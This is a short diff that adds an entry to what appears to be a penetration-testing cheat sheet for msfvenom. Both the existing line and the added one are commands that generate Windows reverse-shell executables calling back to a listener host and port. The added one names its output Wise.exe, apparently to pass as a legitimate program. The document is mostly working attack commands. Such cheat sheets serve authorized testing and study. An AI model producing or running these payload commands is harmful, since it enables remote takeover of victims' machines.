@@ -16,6 +16,9 @@ Reverse Meterpreter payload as an executable and redirected into a file:
 
     $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.1  PORT=4444 –f exe > met.exe
 
+Reverse TCP payload as an EXE creating the Wise.exe program
+
+    $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.138.131 LPORT=7777 -f exe -o Wise.exe
 
 ` Format Options (specified with –f)` 
 
